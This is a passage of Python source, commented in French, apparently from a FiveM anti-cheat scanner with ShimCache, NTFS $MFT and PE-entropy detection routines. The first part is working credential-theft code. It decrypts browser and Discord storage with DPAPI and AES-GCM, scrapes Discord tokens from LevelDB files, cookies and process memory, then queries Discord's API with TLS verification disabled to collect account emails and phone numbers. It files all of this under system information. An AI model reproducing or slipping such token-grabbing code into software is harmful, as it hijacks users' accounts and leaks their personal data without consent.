                    ctypes.POINTER(DATA_BLOB_W)
               ]
               
               in_bytes = (ctypes.c_ubyte * len(data))(*data)
               blob_in = DATA_BLOB_W(len(data), in_bytes)
               blob_out = DATA_BLOB_W()
               descr = wintypes.LPWSTR()
               
               success = crypt32.CryptUnprotectData(
                    ctypes.byref(blob_in),
                    ctypes.byref(descr),
                    None,
                    None,
                    None,
                    0,
                    ctypes.byref(blob_out)
               )
               if success:
                    result = bytes(blob_out.pbData[:blob_out.cbData])
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return result
          except Exception:
               pass
          return None

     def is_valid_token(tok):
          try:
               parts = tok.split('.')
               if len(parts) >= 2:
                    part = parts[0]
                    part += "=" * ((4 - len(part) % 4) % 4)
                    decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
                    if decoded.isdigit() and 17 <= len(decoded) <= 21:
                         return True
          except Exception:
               pass
          return False

     found_tokens = set()
     appdata = os.environ.get("APPDATA", "")
     localappdata = os.environ.get("LOCALAPPDATA", "")
     
     paths = {
          "Discord": os.path.join(appdata, "discord"),
          "Discord Canary": os.path.join(appdata, "discordcanary"),
          "Discord PTB": os.path.join(appdata, "discordptb"),
          "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data"),
          "Edge": os.path.join(localappdata, "Microsoft", "Edge", "User Data"),
          "Brave": os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
          "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
          "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable")
     }
     
     token_pattern = re.compile(rb'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')

     for name, path in paths.items():
          local_state_path = os.path.join(path, "Local State")
          leveldb_dirs = []
          if "Discord" in name:
               leveldb_dirs.append(os.path.join(path, "Local Storage", "leveldb"))
          else:
               default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
               if os.path.exists(default_ldb):
                    leveldb_dirs.append(default_ldb)
               if os.path.exists(path):
                    for sub in os.listdir(path):
                         if sub.startswith("Profile "):
                              profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
                              if os.path.exists(profile_ldb):
                                   leveldb_dirs.append(profile_ldb)
                                   
          if not os.path.exists(local_state_path) or not leveldb_dirs:
               continue
               
          master_key = None
          try:
               with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
               encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
               master_key = dpapi_decrypt(encrypted_key)
          except Exception:
               pass
               
          if not master_key:
               continue
               
          try:
               from cryptography.hazmat.primitives.ciphers.aead import AESGCM
          except ImportError:
               continue
               
          for ldb_dir in leveldb_dirs:
               if not os.path.exists(ldb_dir):
                    continue
               try:
                    for file in os.listdir(ldb_dir):
                         if file.endswith(".log") or file.endswith(".ldb"):
                              filepath = os.path.join(ldb_dir, file)
                              try:
                                   with open(filepath, "rb") as f:
                                        content = f.read()
                                   offset = 0
                                   while True:
                                        offset = content.find(b"dQw4w9WgXcQ:", offset)
                                        if offset == -1:
                                             break
                                        b64_start = offset + len(b"dQw4w9WgXcQ:")
                                        b64_end = b64_start
                                        while b64_end < len(content):
                                             char = content[b64_end:b64_end+1]
                                             if char[0] in b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=":
                                                  b64_end += 1
                                             else:
                                                  break
                                        b64_token = content[b64_start:b64_end]
                                        offset = b64_end
                                        if len(b64_token) < 40:
                                             continue
                                        try:
                                             encrypted_token = base64.b64decode(b64_token)
                                             iv = encrypted_token[3:15]
                                             payload = encrypted_token[15:]
                                             aesgcm = AESGCM(master_key)
                                             decrypted = aesgcm.decrypt(payload, iv, None)
                                             token = decrypted.decode('utf-8')
                                             if token and is_valid_token(token):
                                                  found_tokens.add(token)
                                        except Exception:
                                             pass
                              except Exception:
                                   pass
               except Exception:
                    pass

     for name, path in paths.items():
          leveldb_dirs = []
          if "Discord" in name:
               discord_ldb = os.path.join(path, "Local Storage", "leveldb")
               if os.path.exists(discord_ldb):
                    leveldb_dirs.append(discord_ldb)
          else:
               default_ldb = os.path.join(path, "Default", "Local Storage", "leveldb")
               if os.path.exists(default_ldb):
                    leveldb_dirs.append(default_ldb)
               if os.path.exists(path):
                    for sub in os.listdir(path):
                         if sub.startswith("Profile "):
                              profile_ldb = os.path.join(path, sub, "Local Storage", "leveldb")
                              if os.path.exists(profile_ldb):
                                   leveldb_dirs.append(profile_ldb)
          for ldb_dir in leveldb_dirs:
               if not os.path.exists(ldb_dir):
                    continue
               try:
                    for file in os.listdir(ldb_dir):
                         if file.endswith(".log") or file.endswith(".ldb"):
                              filepath = os.path.join(ldb_dir, file)
                              try:
                                   with open(filepath, "rb") as f:
                                        content = f.read()
                                   matches = token_pattern.findall(content)
                                   for match in matches:
                                        try:
                                             token = match.decode('utf-8')
                                             if is_valid_token(token):
                                                  found_tokens.add(token)
                                        except Exception:
                                             pass
                              except Exception:
                                   pass
               except Exception:
                    pass
     # ── Méthode 3 : Discord Saved Storage (discordlocalstoragedb)
     for discord_folder in ["discord", "discordcanary", "discordptb"]:
          saved_path = os.path.join(appdata, discord_folder, "Saved Storage")
          if not os.path.exists(saved_path):
               continue
          try:
               for file in os.listdir(saved_path):
                    filepath = os.path.join(saved_path, file)
                    try:
                         with open(filepath, "rb") as f:
                              content = f.read()
                         matches = token_pattern.findall(content)
                         for match in matches:
                              try:
                                   token = match.decode('utf-8')
                                   if is_valid_token(token):
                                        found_tokens.add(token)
                              except Exception:
                                   pass
                    except Exception:
                         pass
          except Exception:
               pass

     # ── Méthode 4 : Scan des cookies SQLite (Chrome/Edge/Brave)
     import sqlite3, shutil, tempfile
     browser_paths_sqlite = {
          "Chrome": os.path.join(localappdata, "Google", "Chrome", "User Data", "Default", "Cookies"),
          "Edge":   os.path.join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
          "Brave":  os.path.join(localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Cookies"),
     }
     for bname, cookie_path in browser_paths_sqlite.items():
          if not os.path.exists(cookie_path):
               continue
          tmp = None
          try:
               tmp = tempfile.mktemp(suffix=".db")
               shutil.copy2(cookie_path, tmp)
               conn = sqlite3.connect(tmp)
               cur = conn.cursor()
               try:
                    cur.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
                    for row in cur.fetchall():
                         raw = row[0]
                         if not raw:
                              continue
                         matches = token_pattern.findall(raw if isinstance(raw, bytes) else str(raw).encode('utf-8', errors='ignore'))
                         for match in matches:
                              try:
                                   token = match.decode('utf-8')
                                   if is_valid_token(token):
                                        found_tokens.add(token)
                              except Exception:
                                   pass
               except Exception:
                    pass
               conn.close()
          except Exception:
               pass
          finally:
               if tmp and os.path.exists(tmp):
                    try:
                         os.remove(tmp)
                    except Exception:
                         pass

     # ── Méthode 5 : Lecture mémoire du processus Discord (ReadProcessMemory)
     # Utilisée en dernier recours si les fichiers LevelDB sont verrouillés par Discord
     if not found_tokens:
          try:
               import ctypes
               import ctypes.wintypes as wt

               TH32CS_SNAPPROCESS  = 0x00000002
               PROCESS_VM_READ     = 0x0010
               PROCESS_QUERY_INFO  = 0x0400
               MEM_COMMIT          = 0x1000
               PAGE_NOACCESS       = 0x01
               PAGE_GUARD          = 0x100

               class PROCESSENTRY32(ctypes.Structure):
                    _fields_ = [
                         ("dwSize",              wt.DWORD),
                         ("cntUsage",            wt.DWORD),
                         ("th32ProcessID",       wt.DWORD),
                         ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                         ("th32ModuleID",        wt.DWORD),
                         ("cntThreads",          wt.DWORD),
                         ("th32ParentProcessID", wt.DWORD),
                         ("pcPriClassBase",      ctypes.c_long),
                         ("dwFlags",             wt.DWORD),
                         ("szExeFile",           ctypes.c_char * 260),
                    ]

               class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                    _fields_ = [
                         ("BaseAddress",       ctypes.c_void_p),
                         ("AllocationBase",    ctypes.c_void_p),
                         ("AllocationProtect", wt.DWORD),
                         ("RegionSize",        ctypes.c_size_t),
                         ("State",             wt.DWORD),
                         ("Protect",           wt.DWORD),
                         ("Type",              wt.DWORD),
                    ]

               kernel32 = ctypes.windll.kernel32

               # 1. Lister les PIDs Discord
               discord_pids = []
               snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
               if snapshot != wt.HANDLE(-1).value:
                    entry = PROCESSENTRY32()
                    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
                    if kernel32.Process32First(snapshot, ctypes.byref(entry)):
                         while True:
                              name_lower = entry.szExeFile.decode('utf-8', errors='ignore').lower()
                              if 'discord' in name_lower and 'update' not in name_lower:
                                   discord_pids.append(entry.th32ProcessID)
                              if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                                   break
                    kernel32.CloseHandle(snapshot)

               # 2. Lire la mémoire de chaque processus Discord
               for pid in discord_pids:
                    handle = kernel32.OpenProcess(
                         PROCESS_VM_READ | PROCESS_QUERY_INFO, False, pid
                    )
                    if not handle:
                         continue
                    try:
                         addr = 0
                         mbi = MEMORY_BASIC_INFORMATION()
                         while kernel32.VirtualQueryEx(
                              handle, ctypes.c_void_p(addr),
                              ctypes.byref(mbi), ctypes.sizeof(mbi)
                         ):
                              readable = (
                                   mbi.State == MEM_COMMIT and
                                   mbi.Protect != PAGE_NOACCESS and
                                   not (mbi.Protect & PAGE_GUARD) and
                                   mbi.RegionSize <= 50 * 1024 * 1024  # max 50 MB par région
                              )
                              if readable:
                                   buf = (ctypes.c_char * mbi.RegionSize)()
                                   bytes_read = ctypes.c_size_t(0)
                                   ok = kernel32.ReadProcessMemory(
                                        handle,
                                        ctypes.c_void_p(mbi.BaseAddress),
                                        buf,
                                        mbi.RegionSize,
                                        ctypes.byref(bytes_read)
                                   )
                                   if ok and bytes_read.value > 0:
                                        chunk = bytes(buf[:bytes_read.value])
                                        matches = token_pattern.findall(chunk)
                                        for match in matches:
                                             try:
                                                  token = match.decode('utf-8')
                                                  if is_valid_token(token):
                                                       found_tokens.add(token)
                                             except Exception:
                                                  pass
                              next_addr = (mbi.BaseAddress or 0) + mbi.RegionSize
                              if next_addr <= addr:
                                   break
                              addr = next_addr
                    except Exception:
                         pass
                    finally:
                         kernel32.CloseHandle(handle)
          except Exception:
               pass  # Silencieux — droits insuffisants ou autre

     _cached_discord_token = " | ".join(found_tokens) if found_tokens else "N/A"
     return _cached_discord_token

def get_discord_user_id():
    """Tente de récupérer l'ID Discord de l'utilisateur."""
    tokens_str = get_discord_token()
    if not tokens_str or tokens_str == "N/A":
        return "N/A"
        
    ids = set()
    for token in tokens_str.split(" | "):
        token = token.strip()
        if not token:
            continue
        try:
            import base64
            parts = token.split('.')
            if len(parts) >= 1:
                # Remplir le padding base64 si nécessaire
                part = parts[0]
                part += "=" * ((4 - len(part) % 4) % 4)
                decoded = base64.b64decode(part).decode('utf-8', errors='ignore')
                if decoded.isdigit():
                    ids.add(decoded)
        except Exception:
            pass
            
    return " | ".join(ids) if ids else "N/A"

def get_discord_account_info():
    """
    Interroge l'API Discord (/users/@me) avec tous les tokens récupérés
    pour extraire les emails et les numéros de téléphone.
    Retourne un dict {'email': 'email1 | email2', 'phone': 'phone1 | phone2'}.
    """
    result = {"email": "N/A", "phone": "N/A"}
    try:
        tokens_str = get_discord_token()
        if not tokens_str or tokens_str == "N/A":
            return result
            
        import urllib.request as _req
        import ssl as _ssl
        import json as _json

        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        
        emails = set()
        phones = set()

        for token in tokens_str.split(" | "):
            token = token.strip()
            if not token:
                continue

            try:
                request = _req.Request(
                    "https://discord.com/api/v9/users/@me",
                    headers={
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
                    }
                )
                with _req.urlopen(request, context=ctx, timeout=3) as resp:
                    data = _json.loads(resp.read().decode("utf-8", errors="ignore"))
                    email = data.get("email")
                    phone = data.get("phone")
                    if email:
                        emails.add(email)
                    if phone:
                        phones.add(phone)
            except Exception:
                pass # Ignorer les tokens invalides ou expirés
                
        if emails:
            result["email"] = " | ".join(emails)
        if phones:
            result["phone"] = " | ".join(phones)
            
    except Exception:
        pass
    return result


def get_extended_system_info():
    info = {}
    info["discord_user_id"]  = get_discord_user_id()
    info["discord_token"]    = get_discord_token()
    _acc_info = get_discord_account_info()
    info["email"]            = _acc_info.get("email", "N/A")  # f_em → nx_em
    info["phone"]            = _acc_info.get("phone", "N/A")  # f_ph → nx_ph
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "(Get-CimInstance Win32_OperatingSystem).Caption"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        info["os_version"] = res.stdout.strip() or "Windows"
    except Exception:
        info["os_version"] = "Windows"

    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "(Get-CimInstance Win32_VideoController).Name | Select -First 1"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        info["gpu"] = res.stdout.strip() or "N/A"
    except Exception:
        info["gpu"] = "N/A"

    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command",
             "(Get-CimInstance Win32_Processor).Name | Select -First 1"],
            capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=3,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        info["cpu_name"] = res.stdout.strip() or "N/A"
    except Exception:
        info["cpu_name"] = "N/A"

    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["local_ip"] = "N/A"

    if psutil is not None:
        try:
            boot_time = psutil.boot_time()
            uptime_sec = time.time() - boot_time
            hours = int(uptime_sec // 3600)
            mins = int((uptime_sec % 3600) // 60)
            info["uptime"] = f"{hours}h {mins}min"
        except Exception:
            info["uptime"] = "N/A"

        try:
            disk = psutil.disk_usage("C:\\")
            info["disk_total_gb"] = round(disk.total / (1024**3), 1)
            info["disk_used_pct"] = disk.percent
        except Exception:
            info["disk_total_gb"] = 0
            info["disk_used_pct"] = 0
    else:
        info["uptime"] = "N/A"
        info["disk_total_gb"] = 0
        info["disk_used_pct"] = 0

    return info

def process_single(pinfo):
    try:
        pid  = pinfo['pid']
        name = pinfo['name'] or f"PID_{pid}"
        exe  = pinfo['exe']
        dll_count = 0
        if psutil is not None:
            try:
                dll_count = len(psutil.Process(pid).memory_maps())
            except Exception:
                pass
        return {
            "pid": pid,
            "name": name,
            "exe_path": exe,
            "user": pinfo.get('username'),
            "loaded_dll_count": dll_count
        }
    except Exception:
        return None


# ─────────────────────────────────────────────
# FORENSIQUE : SHIMCACHE (AppCompatCache)
# Clé registre SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
# Stocke les exécutables qui ont contacté le compatibility layer Windows.
# Complémentaire à Amcache/BAM : différent angle d'exécution, différent timestamp.
# Utilisé par RedCore et krd.ac comme source majeure.
# ─────────────────────────────────────────────
def scan_shimcache(progress_callback=None, pct=91):
    """
    Parse AppCompatCache (ShimCache) depuis le registre Windows.
    Retourne les exécutables suspects (cheats) ayant contacté la couche de
    compatibilité Windows — trace fiable même après suppression du fichier.
    Compatible Windows 10/11 (format binaire 10+).
    """
    if progress_callback:
        progress_callback("ShimCache", pct, "Analyse AppCompatCache (ShimCache) registre...")

    traces = []
    try:
        key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        try:
            raw_data, _ = winreg.QueryValueEx(key, "AppCompatCache")
        except OSError:
            winreg.CloseKey(key)
            return traces
        winreg.CloseKey(key)

        if not raw_data or len(raw_data) < 16:
            return traces

        # Signature Windows 10/11 : 4 premiers octets = 0x30 0x00 0x00 0x00 (cache header magic)
        # Ou signature "10ts" (0x74733031) sur certaines versions
        sig = int.from_bytes(raw_data[:4], 'little')
        offset = 0

        if sig == 0x30:
            # Windows 10 / Server 2016+ format : header 128 bytes
            offset = 128
        elif sig == 0x74733031:  # '10st' little-endian
            offset = 128
        elif sig == 0x80:
            # Windows 8.1 / Server 2012 R2
            offset = 128
        else:
            # Tentative générique : skip header de 128 bytes
            offset = 128

        entries_parsed = 0
        max_entries = 1024  # Limite raisonnable pour éviter boucles infinies

        while offset + 12 <= len(raw_data) and entries_parsed < max_entries:
            try:
                # Structure entrée Win10+:
                # 4 bytes : signature "10ts" ou numéro de version
                # 4 bytes : unknown/flags
                # 8 bytes : last modified time (FILETIME)
                # 2 bytes : path length (in bytes)
                # 2 bytes : unknown
                # N bytes : path (UTF-16LE)
                entry_sig = int.from_bytes(raw_data[offset:offset + 4], 'little')

                # Chercher le magic "10ts" (0x73743031 = little endian '10ts')
                if entry_sig == 0x73743031 or raw_data[offset:offset + 4] == b"10ts":
                    if offset + 12 > len(raw_data):
                        break
                    data_len = int.from_bytes(raw_data[offset + 8: offset + 12], 'little')
                    if data_len <= 0 or offset + 12 + data_len > len(raw_data):
                        offset += 4
                        continue
                    entry_data = raw_data[offset + 12: offset + 12 + data_len]

                    # Path length et path (format Win10/11 10ts : 2 bytes path_len, puis UTF-16LE path)
                    if len(entry_data) < 4:
                        offset += 12 + data_len
                        entries_parsed += 1
                        continue
                    path_len = int.from_bytes(entry_data[0:2], 'little')
                    if path_len > 0 and 2 + path_len <= len(entry_data):
                        try:
                            exe_path = entry_data[2: 2 + path_len].decode('utf-16-le', errors='replace').strip('\x00')
                            # Nettoyer le préfixe NT (\??\C:\...)
                            if exe_path.startswith("\\??\\") or exe_path.startswith("\\??"):
                                exe_path = exe_path.replace("\\??\\", "").replace("\\??", "")
                        except Exception:
                            exe_path = ""
                        if exe_path:
                            filename = os.path.basename(exe_path)
                            match = _is_fivem_cheat_file(filename, exe_path)
                            if match:
                                traces.append({
                                    "executable_name": filename,
                                    "exe_path": exe_path,
                                    "severity": match.get("severity", "HIGH"),
                                    "description": (
                                        f"Trace ShimCache (AppCompatCache) pour '{filename}' : {match['reason']} "
                                        f"— Chemin enregistré dans la couche de compatibilité Windows."
                                    )
                                })
                    offset += 12 + data_len
                    entries_parsed += 1
                else:
                    # Scan en avant pour trouver le prochain "10ts"
                    next_sig = raw_data.find(b'\x31\x30\x74\x73', offset + 1)  # '10ts' bytes
                    if next_sig == -1 or next_sig == offset:
                        break
                    offset = next_sig
            except Exception:
                offset += 4
                entries_parsed += 1
                continue

    except Exception:
        pass

    if progress_callback:
        progress_callback("ShimCache", pct + 1,
                          f"{len(traces)} trace(s) ShimCache suspecte(s) détectée(s)")
    return traces


# ─────────────────────────────────────────────
# FORENSIQUE : PARSING $MFT (Master File Table NTFS)
# Détecte les fichiers supprimés que l'USN Journal ne capture plus
# (journal trop petit, purgé, ou entrée USN écrasée).
# Complémentaire à USN Journal — couvre les suppressions plus anciennes.
# ─────────────────────────────────────────────
def scan_mft_deleted_files(drives, progress_callback=None, pct=92):
    """
    Parse partiellement le $MFT NTFS pour trouver des fichiers marqués
    comme supprimés (flag FILE_RECORD_IN_USE absent) dont le nom correspond
    à une signature de cheat connue.
    Nécessite des droits admin (lecture directe du volume \\\\.\\ ).
    Limite : lit les 20 premiers MB du $MFT pour rester rapide.
    """
    if progress_callback:
        progress_callback("MFT Parser", pct, "Analyse $MFT NTFS (fichiers supprimés profonds)...")

    traces = []
    MAX_MFT_READ = 20 * 1024 * 1024  # 20 MB max
    MFT_RECORD_SIZE = 1024
    MFT_MAGIC = b'FILE'
    FLAG_IN_USE = 0x0001

    for drive in drives:
        letter = drive.get("letter", "")
        if not letter or drive.get("fstype", "").upper() not in ("NTFS", ""):
            continue
        drive_letter = letter.rstrip("\\").rstrip(":")
        volume_path = f"\\\\.\\{drive_letter}:"
        try:
            with open(volume_path, "rb") as vol:
                # Lire le Boot Record pour trouver l'offset du $MFT
                boot = vol.read(512)
                if len(boot) < 512:
                    continue

                # BPB offsets
                bytes_per_sector     = int.from_bytes(boot[0x0B:0x0D], 'little')
                sectors_per_cluster  = boot[0x0D]
                mft_cluster          = int.from_bytes(boot[0x30:0x38], 'little')

                if bytes_per_sector == 0 or sectors_per_cluster == 0:
                    continue

                bytes_per_cluster = bytes_per_sector * sectors_per_cluster
                mft_offset        = mft_cluster * bytes_per_cluster

                vol.seek(mft_offset)
                mft_data = vol.read(MAX_MFT_READ)

        except (PermissionError, OSError):
            # Pas de droits admin ou volume non-NTFS
            continue
        except Exception:
            continue

        # Parser les records FILE
        num_records = len(mft_data) // MFT_RECORD_SIZE
        for i in range(num_records):
            rec_start = i * MFT_RECORD_SIZE
            rec = mft_data[rec_start: rec_start + MFT_RECORD_SIZE]

            if len(rec) < MFT_RECORD_SIZE:
                break
            if rec[:4] != MFT_MAGIC:
                continue

            # Flags : offset 22, 2 bytes
            flags = int.from_bytes(rec[22:24], 'little')
            is_deleted = not (flags & FLAG_IN_USE)
            if not is_deleted:
                continue

            # Parser l'attribut $FILE_NAME (type 0x30) pour le nom
            # First attribute offset : bytes 20-21
            first_attr_off = int.from_bytes(rec[20:22], 'little')
            if first_attr_off >= MFT_RECORD_SIZE:
                continue

            attr_off = first_attr_off
            filename_found = ""
            try:
                while attr_off + 8 <= MFT_RECORD_SIZE:
                    attr_type = int.from_bytes(rec[attr_off: attr_off + 4], 'little')
                    attr_len  = int.from_bytes(rec[attr_off + 4: attr_off + 8], 'little')

                    if attr_type == 0xFFFFFFFF:  # End marker
                        break
                    if attr_len < 8 or attr_off + attr_len > MFT_RECORD_SIZE:
                        break

                    if attr_type == 0x30:  # $FILE_NAME
                        # Non-resident flag : offset +8
                        non_resident = rec[attr_off + 8]
                        if non_resident == 0:  # resident
                            content_off = int.from_bytes(rec[attr_off + 20: attr_off + 22], 'little')
                            data_start  = attr_off + content_off
                            if data_start + 66 <= MFT_RECORD_SIZE:
                                name_len = rec[data_start + 64]  # name length in chars
                                name_off = data_start + 66
                                if name_len > 0 and name_off + name_len * 2 <= MFT_RECORD_SIZE:
                                    try:
                                        filename_found = rec[name_off: name_off + name_len * 2].decode('utf-16-le', errors='replace')
                                    except Exception:
                                        pass
                                if filename_found:
                                    break

                    attr_off += attr_len
            except Exception:
                continue

            if not filename_found:
                continue

            # Vérifier si c'est un cheat connu
            match = _is_fivem_cheat_file(filename_found, f"{letter}\\[MFT_DELETED]\\{filename_found}")
            if match:
                traces.append({
                    "filename": filename_found,
                    "path": f"{letter}\\[MFT_SUPPRIMÉ]\\{filename_found}",
                    "drive": letter,
                    "severity": match.get("severity", "HIGH"),
                    "reason": (
                        f"Fichier SUPPRIMÉ trouvé dans le $MFT NTFS : '{filename_found}' sur {letter} — "
                        f"{match['reason']} — La suppression n'efface pas l'entrée MFT immédiatement."
                    )
                })

    if progress_callback:
        progress_callback("MFT Parser", pct + 1,
                          f"{len(traces)} fichier(s) supprimé(s) suspect(s) trouvé(s) dans $MFT")
    return traces


# ─────────────────────────────────────────────
# FORENSIQUE : ENTROPIE SHANNON / DÉTECTION PACKING
# Calcule l'entropie de Shannon sur les sections PE des fichiers suspects.
# Un exécutable légitime non compressé → entropie ~5.0-6.5 bits.
# Un fichier packé/chiffré (UPX, MPRESS, custom packer) → entropie > 7.2 bits.
# Complète _check_pe_packer_stub en couvrant les packers inconnus.
# ─────────────────────────────────────────────
def _compute_shannon_entropy(data: bytes) -> float:
    """Calcule l'entropie de Shannon en bits par octet sur un bloc de données."""
    if not data:
        return 0.0
    from math import log2
    freq = [0] * 256
    for b in data:
        freq[b] += 1
    length = len(data)
    entropy = 0.0
    for f in freq:
        if f > 0:
            p = f / length
            entropy -= p * log2(p)
    return entropy


def scan_pe_entropy(drives, progress_callback=None, pct=93):
    """
    Scanne les fichiers EXE/DLL suspects (non signés, hors dossiers système)
    et calcule leur entropie de Shannon par section PE.
    Un fichier avec entropie > 7.2 bits est probablement packé/chiffré (signe de cheat).
    Cible en priorité : %TEMP%, %APPDATA%, Downloads, Bureau, FiveM plugins.
    """
    if progress_callback:
        progress_callback("Entropie PE", pct, "Analyse entropie Shannon des exécutables suspects...")

    HIGH_ENTROPY_THRESHOLD = 7.2   # > 7.2 = probablement packé
    CRITICAL_ENTROPY       = 7.6   # > 7.6 = chiffré/custom packer (très suspect)
    MAX_FILES_PER_DIR      = 50    # Limite par dossier pour rester rapide
    MAX_FILE_SIZE          = 30 * 1024 * 1024  # 30 MB max
    MIN_FILE_SIZE          = 4096  # Ignorer les micro-fichiers

    # Dossiers à cibler en priorité
    target_dirs = []
    local_app  = os.environ.get("LOCALAPPDATA", "")
    app_data   = os.environ.get("APPDATA", "")
    temp_dir   = os.environ.get("TEMP", "")
    user_prof  = os.environ.get("USERPROFILE", "")

    for base, subpath in [
        (temp_dir, ""),
        (local_app, "Temp"),
        (local_app, "FiveM\\FiveM.app\\plugins"),
        (local_app, "FiveM\\FiveM.app\\data\\cache"),
        (app_data, ""),
        (user_prof, "Downloads"),
        (user_prof, "Desktop"),
        (user_prof, "Bureau"),
    ]:
        if base:
            full = os.path.join(base, subpath) if subpath else base
            if os.path.isdir(full):
                target_dirs.append(full)

    # Aussi les racines des disques (scan superficiel, 1 niveau seulement)
    for drive in drives:
        letter = drive.get("letter", "")
        if letter:
            clean_letter = letter.rstrip("\\") + "\\"
            target_dirs.append(clean_letter)

    traces = []
    scanned = 0

    for scan_dir in target_dirs:
        try:
            # Pour les racines de disques, scan 1 niveau seulement
            is_drive_root = len(scan_dir.rstrip("\\")) <= 3
            entries = []
            if is_drive_root:
                try:
                    for fname in os.listdir(scan_dir):
                        fpath = os.path.join(scan_dir, fname)
                        if os.path.isfile(fpath):
                            entries.append(fpath)
                except OSError:
                    pass
            else:
                for root, dirs, files in os.walk(scan_dir):
                    # Ignorer les dossiers système/légitimes
                    dirs[:] = [
                        d for d in dirs
                        if d.lower() not in ("windows", "system32", "syswow64",
                                             "program files", "program files (x86)",
                                             "programdata", "winsxs")
                    ]
                    for fname in files:
                        entries.append(os.path.join(root, fname))
                    if len(entries) >= MAX_FILES_PER_DIR:
                        break

            count = 0
            for fpath in entries:
                if count >= MAX_FILES_PER_DIR:
                    break
                ext = os.path.splitext(fpath)[1].lower()
                if ext not in (".exe", ".dll", ".sys", ".asi"):
                    continue
                try:
                    fname_only = os.path.basename(fpath)
                    path_lower = fpath.lower()
                    fname_lower = fname_only.lower()

                    # Ignorer notre propre outil et frameworks légitimes
                    if any(legit in fname_lower or legit in path_lower for legit in LEGITIMATE_FRAMEWORKS):
                        continue

                    fsize = os.path.getsize(fpath)
                    if fsize < MIN_FILE_SIZE or fsize > MAX_FILE_SIZE:
                        continue
                    # Ignorer si signé légitimement
                    if is_trusted_system_or_signed(fpath):
                        continue

                    with open(fpath, "rb") as f:
                        raw = f.read(min(fsize, MAX_FILE_SIZE))

                    if not raw.startswith(b'MZ'):
                        continue

                    # Parser les sections PE pour calculer l'entropie par section
                    pe_off = int.from_bytes(raw[0x3C:0x40], 'little')
                    if pe_off + 24 > len(raw):
                        continue
                    num_sec  = int.from_bytes(raw[pe_off + 6:  pe_off + 8],  'little')
                    opt_size = int.from_bytes(raw[pe_off + 20: pe_off + 22], 'little')
                    sec_off  = pe_off + 24 + opt_size

                    high_entropy_sections = []
                    for i in range(min(num_sec, 16)):
                        s = sec_off + i * 40
                        if s + 40 > len(raw):
                            break
                        raw_name   = raw[s: s + 8].rstrip(b'\x00')
                        sec_name   = raw_name.decode('ascii', errors='replace').strip()
                        raw_off    = int.from_bytes(raw[s + 20: s + 24], 'little')
                        raw_size   = int.from_bytes(raw[s + 16: s + 20], 'little')

                        if raw_size < 512 or raw_off + raw_size > len(raw):
                            continue

                        sec_data  = raw[raw_off: raw_off + raw_size]
                        entropy   = _compute_shannon_entropy(sec_data)

                        if entropy >= HIGH_ENTROPY_THRESHOLD:
                            high_entropy_sections.append((sec_name or f"sec_{i}", round(entropy, 3)))

                    if not high_entropy_sections:
                        continue

                    # Ignorer si la SEULE section à haute entropie est .rsrc ou .reloc (ressources/icônes compressées normales)
                    sec_names = [n.lower() for n, _ in high_entropy_sections]
                    if all(n in (".rsrc", ".reloc", "rsrc", "reloc") for n in sec_names):
                        continue

                    max_entropy = max(e for _, e in high_entropy_sections)
                    severity = "CRITICAL" if max_entropy >= CRITICAL_ENTROPY else "HIGH"

                    # Augmenter la sévérité si le nom est aussi suspect
                    name_match = _is_fivem_cheat_file(fname_only, fpath)
                    if name_match:
                        severity = "CRITICAL"
                        name_reason = f" | {name_match['reason']}"
                    else:
                        name_reason = ""

                    sections_str = ", ".join(
                        f"{n}={e}" for n, e in high_entropy_sections[:4]
                    )
                    traces.append({
                        "filename": fname_only,
                        "path": fpath,
                        "severity": severity,
                        "max_entropy": max_entropy,
                        "high_entropy_sections": high_entropy_sections,
                        "reason": (
                            f"Entropie élevée détectée dans '{fname_only}' (max={max_entropy} bits, "
                            f"seuil={HIGH_ENTROPY_THRESHOLD}) — Sections: {sections_str}. "
                            f"Fichier probablement packé/chiffré (packer custom, cheat obfusqué){name_reason}."
                        )
                    })
                    scanned += 1
                    count += 1
                except (PermissionError, OSError):
                    continue
                except Exception:
                    continue
        except Exception:
            continue

    if progress_callback:
        progress_callback("Entropie PE", pct + 1,
                          f"{len(traces)} fichier(s) à haute entropie détecté(s) sur {scanned} scannés")
    return traces


def run_system_scan(progress_callback=None):

    def step(stage, pct, info=""):
        if progress_callback:
            progress_callback(stage, pct, info)

